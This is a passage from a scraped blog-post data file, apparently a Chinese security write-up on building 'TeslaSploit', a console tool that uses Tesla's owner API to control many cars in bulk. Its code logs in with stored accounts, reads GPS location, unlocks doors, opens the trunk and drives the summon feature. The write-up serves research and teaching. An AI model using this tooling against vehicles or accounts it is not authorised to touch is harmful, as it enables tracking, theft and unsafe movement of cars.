&lt;code&gt;find_me&lt;/code&gt;、&lt;code&gt;pin_drop&lt;/code&gt;。&lt;/p&gt;\n&lt;p&gt;分析多次抓包的结果，确定如下流程：&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://p1.ssl.qhimg.com/t0151d84160f0365327.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;以上流程除&lt;code&gt;autopark:cmd_abort&lt;/code&gt;外缺少一个过程都将会导致召唤失败。当然，实际过程中还会有其他数据包，但是不发送也可以成功召唤。&lt;/p&gt;\n&lt;h2 id=\&#34;0x01-系统整体设计\&#34;&gt;0x01 系统整体设计&lt;/h2&gt;\n&lt;p&gt;我将程序的名字命名为TeslaSploit Framework。代码实现以Python3实现。使用协程来完成网络请求，使用的库为aiohttp和websockets。对于程序界面还是选择了交互式控制台的方式，操作和风格与metasploit框架类似。专业叫法为REPL（交互式解释器），即 Read(读取)，Evaluate（执行），Print（打印），Loop（循环）。这里为了快速实现，选择了sploitkit这个库。&lt;/p&gt;\n&lt;p&gt;程序界面如下：&lt;/p&gt;\n&lt;p&gt;&lt;img src=\&#34;https://bacde.me/post-images/1605327033774.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;img src=\&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/ppt/teslasploit01.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;p&gt;目录结构则分为data目录，teslasploit目录，入口文件为程序根目录下main.py。data目录下分别放了config文件夹和token，前者存放账号密码，后者存放登录成功后的token等配置信息。teslasploit目录下又lib、banners、modules，分别存在库文件、bannner和利用模块。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;2\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1605327061782.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;![](/Users/aliceclaudia/work/Blog/远程控制tesla实现/下/images/ppt/截屏2020-10-21 下午12.06.03.png)&lt;/p&gt;\n&lt;p&gt;操作的命令主要以下几个&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;show modules\nuse exploit/tesla/*\nrun\nback\nexit\nset [key] [value]\nshow options\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;对于本次的需求，这些已经足够。&lt;/p&gt;\n&lt;h2 id=\&#34;0x02-编程实现\&#34;&gt;0x02 编程实现&lt;/h2&gt;\n&lt;p&gt;该代码仅在macos系统，python3.8.2的系统环境下运行，其他系统未进行测试。&lt;/p&gt;\n&lt;h3 id=\&#34;控制台\&#34;&gt;控制台&lt;/h3&gt;\n&lt;p&gt;安装sploitkit库，&lt;code&gt;pip install sploitkit&lt;/code&gt;。&lt;/p&gt;\n&lt;p&gt;新建main.py文件，写入如下代码&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;#!/usr/bin/python3\n&amp;quot;&amp;quot;&amp;quot;\nCopyright (c) 2020 Ingeek Tiger-team (https://ingeek.com/)\n&amp;quot;&amp;quot;&amp;quot;\n\nfrom __future__ import print_function\n\ntry:\n    import sys\n    sys.dont_write_bytecode = True\n\n    from teslasploit.lib import TeslasploitConsole\n\nexcept KeyboardInterrupt:\n    sys.exit(&amp;quot;&amp;quot;)\n\nif __name__ == &#39;__main__&#39;:\n    TeslasploitConsole(&amp;quot;tesla&amp;quot;).start()\n\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;在teslasploit/lib/ 文件夹下创建&lt;code&gt;__init__.py&lt;/code&gt; 文件，写入如下代码：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;#!/usr/bin/python3\nimport re\nfrom sploitkit import FrameworkConsole\n\n\nclass TeslasploitConsole(FrameworkConsole):\n    sources = {\n        &#39;banners&#39;:   &amp;quot;./teslasploit/banners&amp;quot;,\n        &#39;entities&#39;:  [&amp;quot;./teslasploit/modules&amp;quot;],\n        &#39;libraries&#39;: &amp;quot;./teslasploit&amp;quot;,\n    }\n    \n    def __init__(self, *args, **kwargs):\n        super(TeslasploitConsole, self).__init__(*args, **kwargs)\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;这样，程序的控制台界面就可以运行了。可以输入&lt;code&gt;python3 main.py&lt;/code&gt; 看看效果了。以上两段代码直接参考&lt;a href=\&#34;https://github.com/dhondta/python-sploitkit\&#34;&gt;https://github.com/dhondta/python-sploitkit&lt;/a&gt; 这里的例子。&lt;/p&gt;\n&lt;p&gt;为了程序界面更加酷炫一些，可以增加ascii字形或ascii图形。python有第三方库可以用。当然网络上也有在线转换的工具。这里选择使用python的asciistuff库。&lt;/p&gt;\n&lt;p&gt;使用如下两行代码，可随机风格的ascii字形：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;from asciistuff import Banner\nprint(Banner(&amp;quot;Test&amp;quot;))\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;img src=\&#34;https://bacde.me/post-images/1605327095611.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;img src=\&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/asciistuff_01.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;p&gt;如果想生成固定的图形，则可以查看&lt;a href=\&#34;https://github.com/dhondta/python-asciistuff/blob/master/asciistuff/fonts.txt\&#34;&gt;https://github.com/dhondta/python-asciistuff/blob/master/asciistuff/fonts.txt&lt;/a&gt;。详细用法自行查看&lt;a href=\&#34;https://github.com/dhondta/python-asciistuff\&#34;&gt;https://github.com/dhondta/python-asciistuff&lt;/a&gt;。这里还有另外一个库，&lt;a href=\&#34;https://github.com/jeffbuttars/cowpy\&#34;&gt;cowpy&lt;/a&gt;，是cow say风格的图形，可根据自己喜好选择是否使用。&lt;/p&gt;\n&lt;p&gt;&lt;img src=\&#34;https://bacde.me/post-images/1605327086469.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;img src=\&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/cowpy.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;h3 id=\&#34;汽车类编写\&#34;&gt;汽车类编写&lt;/h3&gt;\n&lt;p&gt;控制台界面已经有了，先来创建一个名为CarBase的类，后面每台车都基于该类创建一个车辆对象，便于进行批量控制。这里的网络通信主要是用&lt;code&gt;aiohttp&lt;/code&gt;和&lt;code&gt;websockets&lt;/code&gt;两个库来完成。直接使用pip 安装即可。&lt;/p&gt;\n&lt;p&gt;该类主要包括登录、api请求、获取车辆列表、车辆详细信息、控制（开锁、锁车、空调、温度等）、召唤功能。&lt;/p&gt;\n&lt;p&gt;以上功能请求需要用到4个常量，声明如下：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;TESLA_CLIENT_ID =&amp;quot;81527cff06843c8634fdc09e8ac0abefb46ac849f38fe1e431c2ef2106796384&amp;quot;\nTESLA_CLIENT_SECRET =&amp;quot;c7257eb71a564034f9419ee651c7d0e5f7aa6bfbd18bafb5c5c033b093bb2fa3&amp;quot;\nTESLA_BASE_URL =&amp;quot;https://owner-api.teslamotors.com/&amp;quot;\nTESLA_BASE_WS =&amp;quot;streaming.vn.teslamotors.com&amp;quot;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;具体功能定义如下：&lt;/p&gt;\n&lt;p&gt;&lt;img src=\&#34;https://bacde.me/post-images/1605327104917.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;img src=\&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/functions.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;h4 id=\&#34;登录\&#34;&gt;登录&lt;/h4&gt;\n&lt;p&gt;对于aiohttp的基础使用，建议大家去了解一下开发文档。其用法与requests库类似，很容易上手。先以登录来举例子，该代码就是post请求&lt;code&gt;oauth/token?grant_type=password&lt;/code&gt; 登录，登录成功会返回token信息。代码如下：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;async def login(self):\n    data={\n        &amp;quot;grant_type&amp;quot;: &amp;quot;password&amp;quot;,\n        &amp;quot;client_id&amp;quot;: TESLA_CLIENT_ID,\n        &amp;quot;client_secret&amp;quot;: TESLA_CLIENT_SECRET,\n        &amp;quot;email&amp;quot;: self.email,\n        &amp;quot;password&amp;quot;: self.password,\n    }\n    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:\n        async with session.post(TESLA_BASE_URL+&amp;quot;oauth/token?grant_type=password&amp;quot;, data=data) as resp:\n            if resp.status == 200:\n                text = await resp.text()\n                self.token = json.loads(text)\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;img src=\&#34;https://bacde.me/post-images/1605327114461.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;img src=\&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/login.png\&#34; alt=\&#34;login\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;h4 id=\&#34;获取车辆信息\&#34;&gt;获取车辆信息&lt;/h4&gt;\n&lt;p&gt;首先要获取车辆列表，请求地址为&lt;code&gt;/api/1/vehicles&lt;/code&gt;,请求方式为GET。发送后，根据返回的json内容提取id、display_name、vin字段的值。根据id可以获取车辆详细信息。获取车辆详细信息之前还需要发送&lt;code&gt;/api/1/vehicles/{id}/wake_up&lt;/code&gt;(替换{id}为实际id即可)请求，不然车辆如果在没被唤醒状态下会返回错误。&lt;/p&gt;\n&lt;p&gt;车辆详细信息的请求路径为&lt;code&gt;/api/1/vehicles/{id}/vehicle_data&lt;/code&gt;(替换{id}为实际id即可)。在发送请求时都加上&lt;code&gt;Authorization&lt;/code&gt;请求头。获取成功信息以json格式返回，其中包含了很多信息，这里只需要提取vin、display_name、gps、电量、续航、车内温度、车外温度。&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;User-Agent: TeslaSploit\nAuthorization: Bearer [access_token]\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;返回的信息为了便于在控制台下显示，采用了&lt;code&gt;terminaltables&lt;/code&gt;这个库来。显示格式如下：&lt;/p&gt;\n&lt;p&gt;&lt;img src=\&#34;https://bacde.me/post-images/1605327121111.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;img src=\&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/ascii_table.png\&#34; alt=\&#34;ascii_table\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;p&gt;对应的代码部分如下：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;carinfo = self.carinfo[&amp;quot;response&amp;quot;]\n                            \nif carinfo[&amp;quot;state&amp;quot;]==&amp;quot;online&amp;quot;:\n    state = &amp;quot;在线&amp;quot;\nelse:\n    state = &amp;quot;离线&amp;quot;\nprint(&amp;quot;\\n%s (%s)\\n&amp;quot; % (carinfo[&amp;quot;display_name&amp;quot;], state))\n\ngps = &amp;quot;%s, %s&amp;quot; % (carinfo[&amp;quot;drive_state&amp;quot;][&amp;quot;latitude&amp;quot;],carinfo[&amp;quot;drive_state&amp;quot;][&amp;quot;longitude&amp;quot;])\nbattery_level = str(carinfo[&amp;quot;charge_state&amp;quot;][&amp;quot;battery_level&amp;quot;])+&amp;quot;%&amp;quot;\nbattery_range = str(carinfo[&amp;quot;charge_state&amp;quot;][&amp;quot;battery_range&amp;quot;])+&amp;quot;英里&amp;quot;\ninside_temp = carinfo[&amp;quot;climate_state&amp;quot;][&amp;quot;inside_temp&amp;quot;]\noutside_temp = carinfo[&amp;quot;climate_state&amp;quot;][&amp;quot;outside_temp&amp;quot;]\nvin = carinfo[&amp;quot;vin&amp;quot;]        \n\ncar_table = [\n    [&amp;quot;vin&amp;quot;,vin,&amp;quot;电量&amp;quot;,battery_level,&amp;quot;电池续航&amp;quot;,battery_range],\n    [&amp;quot;GPS&amp;quot;,gps,&amp;quot;车外温度&amp;quot;,outside_temp,&amp;quot;车内温度&amp;quot;,inside_temp],\n]\nself.print_table(car_table)\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h4 id=\&#34;控制\&#34;&gt;控制&lt;/h4&gt;\n&lt;p&gt;经过分析，诸如开锁、锁门、开/关空调、设置温度、开启后备箱等请求格式均相似，可以统一使用一个方法来实现。其url地址格式为&lt;code&gt;/api/1/vehicles/{id}/command/{command}&lt;/code&gt;,请求方法为POST，请求数据格式为json格式，如果没有参数可以使用&lt;code&gt;{}&lt;/code&gt;来表示。&lt;/p&gt;\n&lt;p&gt;这里的&lt;code&gt;{command}&lt;/code&gt;为操作指令，主要有door_unlock（ 解锁）、door_lock（ 锁车）、flash_lights（ 闪灯）、honk_horn（鸣笛）&lt;/p&gt;\n&lt;p&gt;、auto_conditioning_start（开空调）、auto_conditioning_stop（关空调）、set_temps（设置温度）、actuate_trunk_rear（开后备箱）。除&lt;code&gt;set_temps&lt;/code&gt;操作指令外，均不需要post data。&lt;code&gt;set_temps&lt;/code&gt;我们之前抓过包，有&lt;code&gt;driver_temp&lt;/code&gt;和&lt;code&gt;passenger_temp&lt;/code&gt;两个参数，分别为驾驶位温度和副驾驶位温度。&lt;/p&gt;\n&lt;p&gt;&lt;img src=\&#34;https://bacde.me/post-images/1605327129175.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;img src=\&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/control.png\&#34; alt=\&#34;control\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;h4 id=\&#34;召唤\&#34;&gt;召唤&lt;/h4&gt;\n&lt;p&gt;召唤功能的流程在上面已经分析清楚，我们只需要按照格式发送和接收数据就可以了。先来个websockets的例子：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;async def main():\n    async with websockets.connect(&#39;ws://10.10.6.91:5678&#39;) as websocket:\n        timestamp = round(time.time()*1000)\n        ping = &#39;{&amp;quot;timestamp&amp;quot;:%d,&amp;quot;msg_type&amp;quot;:&amp;quot;control:ping&amp;quot;,&amp;quot;created:timestamp&amp;quot;:%d}&#39;%(timestamp,timestamp)\n        await websocket.send(ping)\n        recv = await websocket.recv()\n\nasyncio.get_event_loop().run_until_complete(main())\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;接下来就根据上面分析的流程构造发送数据包即可。这里需要注意的是在发送&lt;code&gt;autopark:cmd_forward&lt;/code&gt;和&lt;code&gt;autopark:cmd_reverse&lt;/code&gt;类型的消息时，需要gps位置信息，这个信息位置需要在车辆的gps位置信息附近。所以这里需要先获取车辆的gps信息，在此基础之上做加减法操作即可。具体大家可自己动手操作实践。&lt;/p&gt;\n&lt;h3 id=\&#34;模块\&#34;&gt;模块&lt;/h3&gt;\n&lt;h4 id=\&#34;初始化\&#34;&gt;初始化&lt;/h4&gt;\n&lt;p&gt;汽车的类编写完，接下来就要设计业务流程。&lt;/p&gt;\n&lt;p&gt;为了实现批量控制，这里设计一个sessions的列表，存放车辆信息、token以及车辆的对象。这个sessions列表在模块加载时生成。加载的过程则根据&lt;code&gt;/data/config/account.conf&lt;/code&gt; 的账号列表进行遍历，遍历过程中判断存储在&lt;code&gt;/data/token/&lt;/code&gt;目录下的账号信息文件是否存在，如果存在则直接读取文件，不存在则登录该账户，登录成功后将信息、token存到&lt;code&gt;/data/token/&lt;/code&gt;目录下，并加信息和车辆对象append到sessions列表中，供运行时调用。&lt;/p&gt;\n&lt;p&gt;&lt;img src=\&#34;https://bacde.me/post-images/1605327144827.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;img src=\&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/init.png\&#34; alt=\&#34;init\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;h4 id=\&#34;利用模块\&#34;&gt;利用模块&lt;/h4&gt;\n&lt;p&gt;先来看下splpitkit库模块如何编写,在&lt;code&gt;/teslasploit/modules/exploit&lt;/code&gt;目录下创建&lt;code&gt;tesla.py&lt;/code&gt;,并引用相关库，获取车辆信息代码：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;class Info(Module,teslaBase):\n\n    path = &amp;quot;exploit/tesla&amp;quot;\n    description = &amp;quot;获取车辆信息&amp;quot;\n    config = Config({\n        Option(\n            &#39;vehicle&#39;,\n            &amp;quot;车辆编号&amp;quot;,\n            True,\n        ): 1\n    })\n    def __init__(self):\n        super().__init__()\n        print(self.vehicle_list())\n        \n    def run(self):\n        tasks = []\n        vehicle = self.config.option(&amp;quot;vehicle&amp;quot;).value\n        self.event_loop = asyncio.get_event_loop()\n        carinfos = []\n        if vehicle==0:\n            for i in range(0,len(self.sessions)):\n                task = asyncio.ensure_future(self.sessions[i][&amp;quot;object&amp;quot;].get_info(self.sessions[i][&amp;quot;id&amp;quot;]))\n                tasks.append(task)\n            self.event_loop.run_until_complete( asyncio.gather(*tasks))\n        else:\n            vehicle_session = self.sessions[vehicle - 1]\n            tesla = vehicle_session[&amp;quot;object&amp;quot;]\n            asyncio.run(tesla.get_info(vehicle_session[&amp;quot;id&amp;quot;]))\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;上面的path位use加载的路径，description位利用模块的描述，config是配置的参数选项，可以使用&lt;code&gt;show options&lt;/code&gt;查看，使用&lt;code&gt;set [key] [value]&lt;/code&gt;进行设置。&lt;code&gt;run&lt;/code&gt;方法则是执行run命令时调用。&lt;/p&gt;\n&lt;p&gt;在类初始化的时候调用了获取汽车列表的操作，会打印出要控制的汽车，0代表所有，其他根据编号可单独控制。在&lt;code&gt;run&lt;/code&gt;方法中，你只需要遍历sessions列表就可以实现批量控制了。其他模块与其相似，改动其选项和调用的方法等即可。&lt;/p&gt;\n&lt;p&gt;编写完成后即可运行测试，使用流程如下：&lt;/p&gt;\n&lt;p&gt;&lt;img src=\&#34;https://bacde.me/post-images/1605327220514.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;img src=\&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/use.png\&#34; alt=\&#34;use\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;h2 id=\&#34;0x03-成果展示\&#34;&gt;0x03 成果展示&lt;/h2&gt;\n&lt;p&gt;一切准备就绪，录制了两小段视频给大家。我在安全客10月21日的直播中有分享，大家可以查看链接 &lt;a href=\&#34;https://www.anquanke.com/post/id/220554\&#34;&gt;https://www.anquanke.com/post/id/220554&lt;/a&gt;，有录屏直播、ppt和两个演示视频。&lt;/p&gt;\n&lt;h2 id=\&#34;0x04-总结\&#34;&gt;0x04 总结&lt;/h2&gt;\n&lt;p&gt;本系列文章通过逆向分析并编程实现对特斯拉汽车的批量远程控制功能。重点讲述了针对web和websocket的抓包与python3协程编程的知识，同时也讲述了如何利用第三方库快速高效的构建系统框架。&lt;/p&gt;\n&lt;p&gt;注：本文中仅提供了部分代码，有些可以单独运行，有些则需要自己补充或根据自己思路去进行实现。&lt;/p&gt;\n&lt;h2 id=\&#34;0x05-第三方库\&#34;&gt;0x05 第三方库&lt;/h2&gt;\n&lt;ol&gt;\n&lt;li&gt;&lt;a href=\&#34;https://github.com/dhondta/python-asciistuff\&#34;&gt;https://github.com/dhondta/python-asciistuff&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://github.com/dhondta/python-sploitkit\&#34;&gt;https://github.com/dhondta/python-sploitkit&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://github.com/Robpol86/terminaltables\&#34;&gt;https://github.com/Robpol86/terminaltables&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://github.com/aio-libs/aiohttp\&#34;&gt;https://github.com/aio-libs/aiohttp&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://github.com/aaugustin/websockets\&#34;&gt;https://github.com/aaugustin/websockets&lt;/a&gt;&lt;/li&gt;\n&lt;/ol&gt;\n&#34;,&#34;fileName&#34;:&#34;hacking-all-the-cars-tesla-api-exploit-part-two&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;该系列文章将通过逆向的方式分析Tesla远程api，并自己编写代码实现远程控制Tesla汽车。该篇文章为第二篇，将主要讲解websocket抓包分析与编程实现对Tesla的远程控制。如果你还没看第一篇，请先查看第一篇内容&lt;a href=\&#34;https://bacde.me/post/hacking-all-the-cars-tesla-api-exploit-part-one/\&#34;&gt;Hacking All The Cars - Tesla 远程API分析与利用（上）&lt;/a&gt;。&lt;/p&gt;\n&lt;h2 id=\&#34;0x00-websocket通信分析\&#34;&gt;0x00 Websocket通信分析&lt;/h2&gt;\n&lt;p&gt;Tesla的召唤功能除自动召唤外，还支持手动的前进与后退功能。要想手机APP可以使用召唤功能，需要先在车机中开启召唤功能。&lt;/p&gt;\n&lt;p&gt;在测试时，建议寻找一块比较大的空地，然后设置抓包，使用手机APP进行操作。通过burpsuite抓到的数据包可知，召唤功能主要通过websocket来实现。但是分析过程中可以发现，burpsuite只显示了连接地址和发送的数据内容，并没有显示其请求的头，所以，当直接去连接时会返回401错误。&lt;/p&gt;\n&lt;p&gt;&lt;img src=\&#34;https://bacde.me/post-images/1605326984308.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;img src=\&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/ppt/04_tesla_websockets.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;p&gt;在这个时候就需要还一个工具了，本文选择使用charles。这个工具针对websocket的支持非常友好，不仅可以看到请求头，还针对发送与接收以不同的颜色区分显示出来，十分方便分析。&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;Hacking all the cars之Tesla API分析与利用（下）&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;vehicle&#34;,&#34;slug&#34;:&#34;5-BohUPjKNR&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/5-BohUPjKNR/&#34;},{&#34;name&#34;:&#34;tesla&#34;,&#34;slug&#34;:&#34;VY1b8zpK8Si&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/VY1b8zpK8Si/&#34;},{&#34;name&#34;:&#34;api&#34;,&#34;slug&#34;:&#34;7eD1ZtZoOvK&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/7eD1ZtZoOvK/&#34;},{&#34;name&#34;:&#34;召唤&#34;,&#34;slug&#34;:&#34;B98KLqkGWkD&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/B98KLqkGWkD/&#34;},{&#34;name&#34;:&#34;汽车黑客&#34;,&#34;slug&#34;:&#34;QGWlR0DRxv6&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/QGWlR0DRxv6/&#34;},{&#34;name&#34;:&#34;automotive&#34;,&#34;slug&#34;:&#34;prvJjB7Fua5&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/prvJjB7Fua5/&#34;},{&#34;name&#34;:&#34;cars&#34;,&#34;slug&#34;:&#34;qobuc1uUtQM&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/qobuc1uUtQM/&#34;},{&#34;name&#34;:&#34;oauth&#34;,&#34;slug&#34;:&#34;KWrMfPIO7dM&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/KWrMfPIO7dM/&#34;},{&#34;name&#34;:&#34;特斯拉&#34;,&#34;slug&#34;:&#34;CoQ1NF-VhSi&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/CoQ1NF-VhSi/&#34;},{&#34;name&#34;:&#34;websocket&#34;,&#34;slug&#34;:&#34;ycKQhBbX4p9&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/ycKQhBbX4p9/&#34;}],&#34;date&#34;:&#34;2020-11-14 11:57:41&#34;,&#34;dateFormat&#34;:&#34;2020-11-14&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/hacking-all-the-cars-tesla-api-exploit-part-two/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;13 min read&#34;,&#34;time&#34;:738000,&#34;words&#34;:3037,&#34;minutes&#34;:13},&#34;description&#34;:&#34;该系列文章将通过逆向的方式分析Tesla远程api，并自己编写代码实现远程控制Tesla汽车。该篇文章为第二篇，将主要讲解websocket抓包分析与编程实现对Tesla的远程控制。如果你还没看第一篇，请先查看第一篇内容Hacking Al...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#0x00-websocket%E9%80%9A%E4%BF%A1%E5%88%86%E6%9E%90\&#34;&gt;0x00 Websocket通信分析&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#0x01-%E7%B3%BB%E7%BB%9F%E6%95%B4%E4%BD%93%E8%AE%BE%E8%AE%A1\&#34;&gt;0x01 系统整体设计&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#0x02-%E7%BC%96%E7%A8%8B%E5%AE%9E%E7%8E%B0\&#34;&gt;0x02 编程实现&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%8E%A7%E5%88%B6%E5%8F%B0\&#34;&gt;控制台&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%B1%BD%E8%BD%A6%E7%B1%BB%E7%BC%96%E5%86%99\&#34;&gt;汽车类编写&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%99%BB%E5%BD%95\&#34;&gt;登录&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%8E%B7%E5%8F%96%E8%BD%A6%E8%BE%86%E4%BF%A1%E6%81%AF\&#34;&gt;获取车辆信息&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%8E%A7%E5%88%B6\&#34;&gt;控制&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%8F%AC%E5%94%A4\&#34;&gt;召唤&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%A8%A1%E5%9D%97\&#34;&gt;模块&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%88%9D%E5%A7%8B%E5%8C%96\&#34;&gt;初始化&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%88%A9%E7%94%A8%E6%A8%A1%E5%9D%97\&#34;&gt;利用模块&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#0x03-%E6%88%90%E6%9E%9C%E5%B1%95%E7%A4%BA\&#34;&gt;0x03 成果展示&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#0x04-%E6%80%BB%E7%BB%93\&#34;&gt;0x04 总结&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#0x05-%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93\&#34;&gt;0x05 第三方库&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;该系列文章将通过逆向的方式分析Tesla远程api，并自己编写代码实现远程控制Tesla汽车。&lt;/p&gt;\n&lt;h2 id=\&#34;0x00-简介\&#34;&gt;0x00 